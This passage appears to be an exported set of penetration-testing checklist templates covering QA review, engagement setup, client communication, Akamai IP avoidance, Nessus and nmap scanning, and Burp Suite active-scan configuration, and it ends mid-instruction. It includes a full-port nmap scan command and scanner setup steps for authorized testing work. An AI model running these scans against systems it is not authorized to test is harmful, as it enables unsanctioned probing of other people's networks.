[
	{
		"uid": "cd7979be-8a05-4fee-bd5d-99aef0fc38c0",
		"name": "Project QA",
		"categories": [
			{
				"uid": "5e4c3eb8-e403-4a3c-9bba-315b5ecc072a",
				"name": "Project QA",
				"description": null,
				"type": 1,
				"tasks": [
					{
						"uid": "d6bab918-f44e-4baf-adb6-5bf548ae3214",
						"name": "Confirm Platform or Resolve",
						"instructions": "<p>Confirm that this project was executed in the correct location - Platform or Resolve.</p><p>This <a href='https://netspi.lightning.force.com/lightning/r/Report/00OQp000003wJlJMAU/view'>link from Financial Force </a>shows if it is a Platform project.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "25bb344e-634e-4325-8cc5-6db3b9e4ab7d",
						"name": "Client Specific Requirements*",
						"instructions": "<h3><strong>Instructions:</strong></h3><ul><li><p>Was the <span style=\"color: red\"><strong>client specific checklist</strong></span> added if applicable? Search for the client in the Checklist Templates.</p></li><li><p>Make a comment confirming the Outline was checked to see if this client has specific instructions.</p></li></ul><h3><strong>Client specific requirements:</strong></h3><ul><li><p>Check the following link for client specific instructions:</p><ul><li><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://outline.netspi.com/doc/client-specific-instructions-M3qxSwumJR\">https://outline.netspi.com/doc/client-specific-instructions-M3qxSwumJR</a></p></li></ul></li><li><p>Ensure that the client specific requirements are taken into account in severities, reporting, etc</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "3081b0d8-df5e-4b1b-9ffd-ef27edb4d121",
						"name": "Peer Review Feedback",
						"instructions": "<p>Please fill the peer <a href='https://netspi.sharepoint.com/:l:/s/QualityAssurance/FNKdSQZHvVVIqrkiPo0R63oBwD9bH1X0SrOUilL3eUKNLg?nav=Y2ZmOGZjNGQtOWNkYi00MjEwLTkwZmItMWExOTc0MzAxMzcx'>review feedback form</a> to provide feedback for the engagement:</p><p><a href='https://netspi.sharepoint.com/:l:/s/QualityAssurance/FNKdSQZHvVVIqrkiPo0R63oBwD9bH1X0SrOUilL3eUKNLg?nav=Y2ZmOGZjNGQtOWNkYi00MjEwLTkwZmItMWExOTc0MzAxMzcx'>https://netspi.sharepoint.com/:l:/s/QualityAssurance/FNKdSQZHvVVIqrkiPo0R63oBwD9bH1X0SrOUilL3eUKNLg?nav=Y2ZmOGZjNGQtOWNkYi00MjEwLTkwZmItMWExOTc0MzAxMzcx</a></p><p>The feedback will be shared with the primary consultant's manager and the service lead for the project. The feedback is not provided directly to the consultant.</p><p>4/8/2025 - to be removed:</p><p>Let Mike Larch &amp; Antti Rantasaari know if you'll notice any issues with the feedback form.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 0,
				"collapsed": true
			},
			{
				"uid": "8bf9d3aa-67f9-4c9a-8b48-bad22f54f642",
				"name": "QA Responsibility - Workspace QA",
				"description": null,
				"type": 2,
				"tasks": [
					{
						"uid": "a61891ad-a1fd-49d2-8d6f-8e7cc1416547",
						"name": "Workspace - Artifact(s)",
						"instructions": "<h3><strong>Artifacts:</strong></h3><ul><li><p>(Resolve) Burp State file has been uploaded to Artifacts</p></li><li><p>(Platform) Burp State file has been uploaded to Documents &gt; Internal</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "79cd97ac-5cd9-433a-9119-6e59eacf6325",
						"name": "Workspace - Findings, CVSS, and Deliverables",
						"instructions": "<h3><strong>Findings:</strong></h3><ul><li><p>Verify all findings have been published.</p></li></ul><h3><strong>CVSS:</strong></h3><ul><li><p>Within the Platform or Resolve Findings tab, compare the severity of the finding to the CVSS score. Address any that mismatch.</p></li></ul><h3><strong>Deliverables uploaded to Sharepoint:</strong></h3><ul><li><p>Report</p></li><li><p>Spreadsheet</p></li><li><p>Attestation Letter</p></li><li><p>Client-specific deliverables (as needed) </p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "3a566a9d-d647-4f40-8b39-6a611f5b4055",
						"name": "Workspace QA*",
						"instructions": "<h3><strong>Workspace:</strong></h3><ul><li><p>Pay special attention to<strong> </strong><span style=\"color: rgb(219, 39, 25)\"><strong>Unedited Findings</strong></span><strong> </strong>that were added</p></li><li><p>All findings have been finalized</p></li><li><p>Look for possible false positives / false negatives</p></li><li><p>All scans have been imported (Nessus, Burp, Nexpose, etc.)</p></li><li><p>Review open ports under Information section to verify all services were discovered and reported</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "0552f177-09d0-46a9-baf7-152f200d2ab8",
						"name": "Workspace Checklist*",
						"instructions": "<h3><strong>Checklist:</strong></h3><ul><li><p>Were appropriate Client Specific Checklists added?</p></li><li><p>Are all the checks completed - either Final or N/A</p></li><li><p>Are comments high quality content?</p><ul><li><p>Note: Quality comments should directly relate to  the Peer Review Feedback form.</p></li></ul></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 1,
				"collapsed": true
			},
			{
				"uid": "0f398bdc-ca32-48c2-b747-66e0f9736c71",
				"name": "QA Responsibility - Workflows",
				"description": "<p>Workflows the QAer will validate were considered during the engagement.</p>",
				"type": 2,
				"tasks": [
					{
						"uid": "159bf409-7dd4-43da-ac81-5b14409a724f",
						"name": "QA - Multi-Factor Authentication Workflow",
						"instructions": "<h3><strong>QAer Task Instructions:</strong></h3><ul><li><p>Was MFA tested? If MFA is not available, then there should be a finding for <code>Multi-Factor Authentication not Supported</code>.</p></li><li><p>Otherwise, the <code>[Dynamic] Multi-Factor Authentication (MFA)</code> checklist should have been added and various tasks reviewed.</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "9a72ef74-583f-465b-a82a-eac3188045e0",
						"name": "QA - Self-Registration Workflow",
						"instructions": "<h3><strong>QAer Task Instruction:</strong></h3><ul><li><p><span style=\"color: rgb(51, 51, 51); background-color: rgb(255, 255, 255)\">Is self-registration available in the application, and if so, is there evidence it was tested?</span></p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "e0ac97b0-2c40-421b-aed2-a342decbd196",
						"name": "QA - Forgot Password Workflow",
						"instructions": "<h3><strong>QAer Task Instructions:</strong></h3><ul><li><p><span style=\"color: rgb(51, 51, 51); background-color: rgb(255, 255, 255)\">Forgot password workflow happens pre-authentication and is typically a link on the login page. Ensure this workflow was tested.</span></p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "f30d6f6d-4b05-4d6a-bd85-9bceef832653",
						"name": "QA - Password Reset Workflow",
						"instructions": "<h3><strong>QAer Task Instructions:</strong></h3><ul><li><p><span style=\"color: rgb(51, 51, 51); background-color: rgb(255, 255, 255)\">There are numerous checks in the checklist related to password reset. Take time to check that it was sufficiently tested.</span></p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 2,
				"collapsed": true
			},
			{
				"uid": "f18087d9-07dd-4ff6-b18a-3bd34cd1c14f",
				"name": "QA Responsibility - Report QA",
				"description": null,
				"type": 2,
				"tasks": [
					{
						"uid": "1c2c7ee7-ffc5-4de7-92c3-a561ebddb9e8",
						"name": "Report QA - General",
						"instructions": "<h3><strong>Instructions:</strong></h3><ul><li><p>Track changes in the report</p></li><li><p>Validate the Project matches the report</p></li><li><p>Report Version:</p><ul><li><p>Add your name to the end of the report and makes sure all the tables are updated (CTRL+A, F9)</p></li></ul></li></ul><h3><strong>Scope:</strong></h3><ul><li><p>Project scope outlined as per the scope in the kickoff document </p></li><li><p>Check if there are any deviations from the scope and mention those in a Comment</p><ul><li><p>For example if testing was blocked or the scope was reduced. Basically include anything that was out of the ordinary or that prevented testing.</p></li></ul></li></ul><h3><strong>Summary of Findings:</strong></h3><ul><li><p>Finding severity counts match Document Navigation heading counts</p></li><li><p>If any false positive / false negatives are added or removed, comment that the Summary of Findings must be updated</p><ul><li><p>Also comment that the CSV spread sheet must be updated to match the finding count change.</p></li></ul></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "74e626b8-d239-42ab-8fa7-844bf43e0a4d",
						"name": "Report QA - Verification Steps",
						"instructions": "<h3><strong>Verification Steps:</strong></h3><ul><li><p>Check that the correct assets and ports are used for each finding</p></li><li><p>Verification scenario steps are easy to follow from start to finish</p></li><li><p>Screenshots are legible and relevant data is highlighted</p></li><li><p>Ensure that sensitive data is appropriately redacted from both verification text and screenshots</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "bb1ea386-e56c-4264-acb5-d92a08506a88",
						"name": "Report QA - Client Data",
						"instructions": "<p><span style=\"color: red\"><strong>It is vital that we do not post client data across projects. Please take special care for this item.</strong></span></p><h3><strong>Client Data Instructions:</strong></h3><p>Please make a comment that this item has been reviewed for all verification steps/assets.</p><ol><li><p>Review the project scope and ensure that all Assets in the workspace match the project scope</p></li><li><p>Review verification items and observe discrepancies in URL/IP/Asset name/screenshots</p><ol><li><p>If a verification item does not appear to match the project scope, have the tester confirm that the items are aadded for the correct client.</p></li></ol></li><li><p>Review the Attestation letter for the correct company name and project name.</p></li><li><p>Review the CSV file for DNS name and Affected URL columns. These should match the client information.</p></li></ol><h3><strong>Tip:</strong></h3><p>Searching through the Word document for the strings <code>Host:</code> , <code>Affected URL</code>,  and <code>Affected Asset</code> will help you quickly view all the HTTP request blocks and affected asset tables for the correct URLs. However, all the screen shots must also be verified manually.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 3,
				"collapsed": true
			}
		],
		"checklistTemplateUid": "cb2907bf-a66b-42a6-ab34-55efe78378d0",
		"isDeleted": false
	},
	{
		"uid": "ad704999-a87f-433e-a08e-a19cb34f2bd5",
		"name": "APIPEN & WAPEN - Intro",
		"categories": [
			{
				"uid": "c815c2e1-2f3f-44a8-abc7-4050358a8a4a",
				"name": "Engagement Setup",
				"description": "",
				"type": 1,
				"tasks": [
					{
						"uid": "e40b61f2-fc87-4644-b945-c25a746872e7",
						"name": "Previous Engagements",
						"instructions": "<h3><strong>Previous Tests:</strong></h3><ul><li><p>Review the client in Platform for previous years to see if the application is been tested before.</p></li><li><p>Review all the previously identified vulnerabilities in any WAPens and test if they have been remediated.</p></li><li><p>Review the notes and checklists from the previous years' WAPens to better understand any potential obstacles</p></li><li><p>Migrate any relevant information to the new checklist and update it as necessary.</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "b899ff02-c3f8-438d-838b-2399c9920af1",
						"name": "Turn OFF Burp AI features*",
						"instructions": "<h3><strong>Instructions:</strong></h3><p>In Burp, go to Settings -&gt; Search for \"ai\" and turn off the master switch for it.</p><p>Add a comment stating at least that you made sure the feature is off before beginning testing.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "6b35d5a0-9944-4942-86d9-2f3bbc6a0c1b",
						"name": "No Akamai IPs",
						"instructions": "<h3><strong>Instructions</strong></h3><p>Confirm that no Akamai IPs are used. Scanning Akamai places NetSPI's IP ranges into block lists.</p><p>Perform a whois lookup for Akamai IP ranges: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://whois.arin.net/ui/query.do\">https://whois.arin.net/ui/query.do</a> and/or you can use the script below.</p><p><strong>DO NOT</strong> continue testing if you find that the application is behind Akamai - communicate with the client that not scanning Akamai is a requirement and we need the server IPs. If they have allow listed our IPs, post a screen shot of the email in this task as a comment.</p><h3><strong>Variation: Automated Review</strong></h3><p>1. Download and install netblock tool from <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/NetblockTool\">https://github.com/NetSPI/NetblockTool</a>.</p><pre><code>git clone https://github.com/NetSPI/NetblockTool.git\ncd NetblockTool &amp;&amp; pip3 install -r requirements.txt</code></pre><p>2. Below are the subsidiary options.</p><p><strong>HTTP Request</strong>: </p><pre><code>Company Subsidiaries:\n  -s Fetch subsidiary information and return netblocks of all subsidiaries in addition to initial target\n\n    -sn       Company name to use when fetching subsidiaries\n\n    -sp       Use alternate parsing method when fetching subsidiary information; use\n\n                  if the default method isn't working as expected\n\n    -so       Write subsidiary information to a text file (CompanyName_subsidiaries.txt)</code></pre><p>3. Run the tool with the desired options.</p><pre><code>python3 NetblockTool.py -v Company -s -sn companyname</code></pre><p>Below are some of the historical ranges.</p><p>AKAMAI (NET6-2600-1400-1) 2600:1400:: - 2600:14FF:FFFF:FFFF:FFFF:FFFF:FFFF:FFFF</p><p>AKAMAI (NET-104-64-0-0-1) 104.64.0.0 - 104.127.255.255</p><p>AKAMAI (NET-172-224-0-0-1) 172.224.0.0 - 172.239.255.255</p><p>AKAMAI (NET-173-222-0-0-1) 173.222.0.0 - 173.223.255.255</p><p>AKAMAI (NET-184-24-0-0-1) 184.24.0.0 - 184.31.255.255</p><p>AKAMAI (NET-184-50-0-0-1) 184.50.0.0 - 184.51.255.255</p><p>AKAMAI (NET-184-84-0-0-1) 184.84.0.0 - 184.87.255.255</p><p>AKAMAI (NET-199-233-48-0-1) 199.233.48.0 - 199.233.56.255</p><p>AKAMAI (NET-204-188-136-0-3) 204.188.136.0 - 204.188.143.255</p><p>AKAMAI (NET-206-246-200-128-1) 206.246.200.128 - 206.246.200.143</p><p>AKAMAI (NET-209-170-111-0-1) 209.170.111.0 - 209.170.111.255</p><p>AKAMAI (NET-209-170-68-128-1) 209.170.68.128 - 209.170.68.255</p><p>AKAMAI (NET-209-170-76-0-1) 209.170.76.0 - 209.170.77.255</p><p>AKAMAI (NET-209-170-78-128-1) 209.170.78.128 - 209.170.78.255</p><p>AKAMAI (NET-209-170-79-0-1) 209.170.79.0 - 209.170.79.127</p><p>AKAMAI (NET-209-170-86-0-1) 209.170.86.0 - 209.170.87.255</p><p>AKAMAI (NET-209-170-97-0-1) 209.170.97.0 - 209.170.97.255</p><p>AKAMAI (NET-209-170-98-0-1) 209.170.98.0 - 209.170.98.255</p><p>AKAMAI (NET-209-234-252-0-1) 209.234.252.0 - 209.234.252.255</p><p>AKAMAI (NET-209-95-131-128-1) 209.95.131.128 - 209.95.131.255</p><p>AKAMAI (NET-209-95-135-128-1) 209.95.135.128 - 209.95.135.191</p><p>AKAMAI (NET-209-95-150-192-1) 209.95.150.192 - 209.95.150.255</p><p>AKAMAI (NET-216-120-199-0-1) 216.120.199.0 - 216.120.199.31</p><p>AKAMAI (NET-23-0-0-0-1) 23.0.0.0 - 23.15.255.255</p><p>AKAMAI (NET-23-192-0-0-1) 23.192.0.0 - 23.223.255.255</p><p>AKAMAI (NET-23-32-0-0-1) 23.32.0.0 - 23.67.255.255</p><p>AKAMAI (NET-23-72-0-0-1) 23.72.0.0 - 23.79.255.255</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "bb222896-c9ed-4cfc-beb6-4267d02a5f74",
						"name": "Engagement Type and BU Checklist*",
						"instructions": "<h3><span><strong>Instructions:</strong></span></h3><ol><li><p><span>Verify the Project Type is properly set for this project.</span></p></li><li><p><span style=\"color: red\"><strong>Add any Client Specific Checklist - make a comment confirming Client Specific Checklists were added if necessary.</strong></span></p></li><li><p><span>Set the Project Status to In Progress.</span></p></li><li><p><span>Set the Project Short Name.</span></p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "134b8109-006e-4393-82da-9879a275961f",
						"name": "Start / Stop Notification",
						"instructions": "<h3><span><strong>Instructions:</strong></span></h3><p><span>At the start of testing, send the client a note that testing is beginning. Resolve comments in the project are the preferred method of communication, but some clients exclusively use email. </span><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://outline.netspi.com/doc/start-message-template-f7KcaKhkA0\"><span>Engagement start message template</span></a><span>.</span></p><p><span>At the end of <strong>each day of testing</strong>, send the client a daily status update. This is a short summary of activities from the day along with some high-level finding information. </span><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://outline.netspi.com/doc/daily-status-template-5vQOsuQnYX\"><span>Daily status template</span></a><span>.</span></p><p><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://outline.netspi.com/doc/daily-status-example-wapen-izrVoz808h\"><span>Daily Status Example</span></a><span>.</span></p><p><span>At the end of testing on the final day, notify the client that testing is complete. Mention that the testing environment may still be accessed during the reporting phase. </span><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://outline.netspi.com/doc/testing-complete-template-AnMpt7GyQD\"><span>Engagement end message template</span></a><span>.</span></p><h3><span><strong>Additional information:</strong></span></h3><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://outline.netspi.com/doc/ptaas-1pUNiMYtCo#h-communication\"><span>https://outline.netspi.com/doc/ptaas-1pUNiMYtCo#h-communication</span></a></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 12,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 0,
				"collapsed": true
			},
			{
				"uid": "896566d8-2548-4833-b850-c12187520238",
				"name": "Application Information",
				"description": "Application information and interview questions for application walkthroughs",
				"type": 2,
				"tasks": [
					{
						"uid": "3c810c66-3546-4108-abfb-13d008493f01",
						"name": "Application Workflows*",
						"instructions": "<h3><strong>Instructions:</strong></h3><p>Add one sentence describing <span style=\"color: rgb(219, 39, 25)\"><strong>EACH</strong></span> of the following workflows. If it does not apply, explain why it is N/A.</p><ol><li><p>Password reset</p></li><li><p>Forgot password</p></li><li><p>Self registration</p></li><li><p>MFA flow(s)</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "701dbe1f-9a80-4a8d-ba7c-32a94361c081",
						"name": "Application Technologies",
						"instructions": "<h3>Demo Notes:</h3><ul><li><p>Ask about the following workflows:</p></li><ul><li><p>Self-registration - is this available within the application and can we perform this as part of testing?</p></li><li><p>Password reset - this is the post-authentication password reset flow. How does it work?</p></li><li><p>Forgot password - this is pre-authentication flow. How does it work?</p></li><li><p>MFA flows - if MFA is available in the application, ask for specific on how it works and if there is more than one type of MFA available (e.g., SMS, OTP, email, etc.)</p></li></ul></ul><h3>Instructions:</h3><ol><li><p>Watch/Review the recording of the demo.</p></li><ol><li><p><strong>If the demo does not align with the Scope, contact the CDM immediately.</strong></p></li></ol><li><p>Make sure the Workflows (previous checklist item) are filled out so that these flows can be tested.</p></li><li><p>Use the following questions to note technologies used by the application.</p></li></ol><h3>Application Information Questions:</h3><ol><li><p>Is this a Production test? If so, read the <a href='https://outline.netspi.com/doc/production-testing-OTPYHlbd4D'>Rules of Engagement for Prod Testing</a>.</p></li><li><p>Is this a multi-tenant application? If so, request appropriate cross-tenant accounts.</p></li><li><p>Confirm the in-scope roles and areas of the application that are only available to higher-level roles.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "ded5e69a-d54c-4757-91a3-8408000c474e",
						"name": "Application Users/Roles and IPs/URLs*",
						"instructions": "<h3><strong>Credentials and Tokens:</strong></h3><p>Document any credentials or tokens provided such as:</p><ul><li><p>username+password and role</p></li><li><p>MFA or 2FA config - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://passwords.netspi.com\">NetSPI Password State</a> can be used for TOTPs</p></li><li><p>Private keys or certificates</p></li><li><p>Session tokens</p></li></ul><p>Update the credentials whenever they are changed (such as during password reset testing). This allows another consultant to jump into the application if needed.</p><h3><strong>IPs and/or URLs:</strong></h3><ul><li><p>Document all in-scope application IPs and URLs</p></li><li><p>If there are specific connection requirements such as client VPN, connection through a NUC, etc., document <strong>all necessary information</strong> and instructions for another consultant to be able to connect</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "03d6d10a-1381-4feb-8d74-a8ac96073000",
						"name": "APIPEN Information & Requirements",
						"instructions": "<h3><strong>Instructions:</strong></h3><p>When testing APIs without a frontend, the <span style=\"color: red\"><strong><em>machine-readable</em></strong></span> API specification file must be provide by the client, preferably OpenAPI 3.0 or PostMan collection.</p><p>If <span style=\"color: red\"><strong>machine-readable</strong></span> API specification files and sample data cannot be provided for all in-scope API endpoints:</p><ol><li><p>Notify the client that sample data is needed to perform proper testing against the endpoints; use Resolve/Platform comments to leave a written record, send an email without any sensitive data stating the same.</p></li><li><p>Notify the PM that testing cannot be completed without sample data. Ask the PM to escalate with the client if they are not providing the data.</p></li><li><p>If the client cannot provide valid test data within the testing window, note the untested endpoints or methods in Resolve.</p></li><li><p>During reporting, note that some of the APIs could not be tested due to missing data in the Scope &amp; Timeframe section. If the API endpoint list is long, an appendix can be used to list the API endpoints instead of the Scope &amp; Timeframe section.</p></li></ol><h3><strong>Add Dynamic Checklist:</strong></h3><p>If this is an API test, add the <span style=\"color: rgb(219, 39, 25)\"><strong>[Dynamic] - Web Services</strong></span> checklist (<strong>must search via Name</strong>) and proceed to complete the tasks within that Checklist.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 1,
				"collapsed": true
			}
		],
		"checklistTemplateUid": "97643a08-b7e2-4a31-9b6b-c0fb41860cc7",
		"isDeleted": false
	},
	{
		"uid": "581e8709-3fe8-4a59-8309-d02820117f9e",
		"name": "APIPEN & WAPEN - Main",
		"categories": [
			{
				"uid": "60ae8aed-96e3-4499-9b4e-3227bcaa9aae",
				"name": "Automated Scanning",
				"description": "",
				"type": 2,
				"tasks": [
					{
						"uid": "d3588ae9-e2ae-4bd6-a514-2e552075c04e",
						"name": "Nessus*",
						"instructions": "<h3>Instructions:</h3><p>Information with screenshots on how to run <a href='https://outline.netspi.com/doc/nessus-UGKRWpjzeh#h-running-scans'>Nessus Scans</a> is in the Outline.</p><p><strong><span style=\"color: #DB2719\">Create a comment confirming Nessus successfully completed or explaining why that cannot be the case.</span></strong></p><h3>TL;DR</h3><ol><li><p>Visit passwords.netspi.com.</p></li><li><p>Search for &quot;Nessus&quot; and select a relevant record.</p></li><li><p>Note the Nessus URL, username, and password.</p></li><li><p>Browse to the NetSPI Nessus application and login.</p></li><li><p>For first time users, create a New Folder with the &quot;flast&quot; naming convention.</p></li><li><p>In your folder, click on &quot;New Scan&quot;.</p></li><li><p>Choose the updated scan profile to scan with. This scan will usually be named with the words &quot;NetSPI Standard&quot;.</p></li><li><p>Enter the name and targets. Click on &quot;Save&quot; or &quot;Launch&quot; to start the scan immediately.</p></li><li><p>Upon completion, browse to the overview of the completed scan. Click on &quot;Export&quot; and choose the Nessus export file.</p></li><li><p>Import the scan data into Sources tab in Resolve.</p></li></ol><p>Periodically review and delete unneeded Nessus scans from your folder.</p><h3>Nmap:</h3><p>If Nessus cannot be run (due to routing or internal only application), then an Nmap full TCP port scan should be performed from the local test machine.</p><p>An Nmap scan is not required if the Nessus scan is possible.</p><pre><code>$ sudo nmap -p- -sS -A {target_endpoint} -oX {client_name}_FullTCP_Nmap</code></pre><p>Import the .xml file under the Sources tab. This will result in an Informational finding in the Workspace called <code>General Information - Open Port</code>. Look into any open ports to see if there are services beyond HTTP/HTTPS that should not be listening.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "212fc4ab-81fd-4522-9305-2e8f6bd8e33e",
						"name": "Burp Suite Configuration Setup*",
						"instructions": "<h3>Burp Suite Setup Instructions:</h3><ol><li><p>Ensure Burp is at the latest version. Click Help -&gt; Check for updates</p></li><li><p>Install Scanny Assist - available at https://github.com/NetSPI/ScanAssistant/releases and make sure you have the most recent version</p></li><li><p><strong><span style=\"color: #DB2719\">&#42;Create a comment here that Scanny Assist was installed and will be used for this test</span></strong></p></li><li><p>Confirm Burp Collaborator is reachable by running a health check. <strong>Note:</strong> this will only be successful on the VPN or within the office.</p></li></ol><h3>Burp Suite Active Scanning Setup:</h3><ol><li><p>Set the Scope:</p></li><ol><li><p>Target &gt; Site Map &gt; Right-click the item and select &quot;Add to Scope&quot; for each location that is considered in scope.</p></li><li><p>Target &gt; Scope settings &gt; Check Advanced Scope Control &gt; Click Add and manually enter all the details that matches the scope of the project.</p></li></ol><li><p>Create new Audit Configurations:</p></li><ol><li><p>Dashboard &gt; Click the &quot;Gear&quot; under Live audit from Proxy &gt; Scan configuration &gt; New &gt; <strong><span style=\"color: #DB2719\">Cookies_Headers</span></strong></p></li><ol><li><p>Under Insertion Point Types &gt; Uncheck everything except <strong>Cookie parameter values</strong> and <strong>HTTP Headers</strong></p></li><li><p>Under Misc Insertion Point Options &gt; Change the maximum to 1000</p></li></ol><li><p>Dashboard &gt; Click the &quot;Gear&quot; under Live audit from Proxy &gt; Scan configuration &gt; New &gt; <strong><span style=\"color: #DB2719\">NO_Cookies_Headers</span></strong></p></li><ol><li><p>Under Insertion Point Types &gt; Uncheck <strong>Cookie parameter values</strong> and <strong>HTTP Headers</strong></p></li><li><p>Under Misc Insertion Point Options &gt; Change the maximum to 1000</p></li></ol></ol></ol><h3>Scanning Instructions:</h3><ol><li><p>Scan a request that includes all cookies and headers used by the application using the new Cookies_Headers Audit Configuration.</p></li><li><p>Scan all application pages that accept parameters with the NO_Cookies_Headers Audit Configuration.</p></li><li><p>To scan a single request, right-click on a request in the Proxy tab/Repeater tab &gt; Do active scan.</p></li><li><p>You can scan multiple requests at the same time by holding Control while selecting the requests, then right-clicking, and selecting Do an active scan.</p></li><li><p>Monitor automated scans in Logger to ensure that the session stays active. Especially when many scans are queued or they just go slowly.</p></li></ol><h3>Session Refreshing (as needed):</h3><p>Create a Login macro following these instructions:</p><ol><li><p>Settings &gt; Sessions &gt; Macros</p></li><li><p>Click Add and name the new macro &quot;Login refresh&quot; or similar</p></li><li><p>In the Macro Recorder window that appears (if it doesn't, click the Record Macro button), select the request(s) necessary to successfully authenticate; if there are redirects as part of the natural flow only the original request that submits the username and password is necessary.</p></li><li><p>Click OK with the appropriate requests selected and Click OK after giving the Macro a name.</p></li></ol><p>Configure a Session Handler to use the macro from above to automatically submit the login macro when the session has expired:</p><ol><li><p>Settings &gt; Sessions 